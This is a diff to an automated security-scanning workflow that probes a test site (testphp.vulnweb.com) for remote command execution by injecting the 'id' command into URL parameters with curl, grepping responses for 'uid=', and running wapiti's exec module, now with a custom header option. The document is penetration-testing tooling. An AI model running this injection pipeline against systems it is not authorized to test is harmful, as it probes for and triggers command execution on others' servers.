@@ -1,6 +1,7 @@
 description: Searches for Remote Command Execution (RCE) vulnerabilities by first gathering URLs from the target using 'gau'. These URLs are then filtered for potential RCE vulnerabilities using 'gf', deduplicated, and checked with 'httpx' to ensure they are alive. Each URL is modified to replace query parameters with the 'id' command, These modified URLs are accessed with 'curl', and if any responses contain the string "uid=", indicative of RCE, the URL is flagged as vulnerable. This process identifies critical security issues where an attacker could force the server to run shell commands.
 tags: rce, security, bash, curl
-params: target=testphp.vulnweb.com
+params: target=testphp.vulnweb.com, header="Example:Blackdagger"
+# Change header without blank if you need or add authorization
 env:
   - HOME: /root/
   - LOG_DIR: ${HOME}/logs
@@ -13,8 +14,8 @@ steps:
   - name: CustomRCE-Internal
     command: bash
     script: |
-      ~/go/bin/httpx -u ${target//\"} | katana qurl | gf rce | sort -u | anew | httpx | qsreplace id | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "uid=" && echo "RCE VULN! %" || true'
+      ~/go/bin/httpx -u ${target//\"} | katana -H "$header" qurl | gf rce | sort -u | anew | ~/go/bin/httpx -H "$header" | qsreplace id | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "uid=" && echo "RCE VULN! %" || true'
   - name: AutoRCE
     command: bash
     script: |
-      wapiti -m exec -u http://${target//\"}
+      ~/go/bin/httpx -u $target -o resRCE_${target//\"}.txt ; wapiti -u "$(cat resRCE_${target//\"}.txt)" -m exec -H "$header"
